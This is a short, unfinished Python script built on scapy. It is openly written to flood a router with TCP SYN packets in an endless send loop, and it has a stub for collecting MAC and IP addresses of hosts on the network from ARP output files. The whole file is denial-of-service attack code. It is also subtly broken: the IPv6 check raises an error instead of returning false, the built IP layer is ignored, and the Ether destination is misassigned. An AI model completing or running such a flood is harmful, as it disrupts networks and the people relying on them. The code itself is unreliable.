from scapy.all import *
import argparse

# Generates packets to overwhelm your router

# Determines if a given address is IPv4 or v6
def is_ipv6(address):
    return address.index(":") != -1


# Generates SYN flood
def spam_router(router_mac, router_ip):
    e = Ether(router_mac)
    t = TCP(flags="S")
    if is_ipv6(router_ip):
        i = IPv6()
    else:
        i = IP()
    i.dst = router_ip
    sendp(e / IP() / t, loop=1)


# Finds MAC and IP addresses in the text files
def extract_mac_IP_pair():
    with open("arp_query.txt") as fin:
        arp_lines = fin.readlines()
    with open("hostname_ARP.txt") as fin:
        hostname_lines = fin.readlines()
    # gets the IP and MAC address tuple for a given hostname
    hostname_to_IP_MAC = {}
    # TODO extract MAC and IP addresses with regex
    return hostname_to_IP_MAC


def main():
    address_dict = extract_mac_IP_pair()
    # TODO use extract MAC IP pair function to find
    # addresses of networked computers
    # spam_router()


if __name__ == "__main__":
    main()
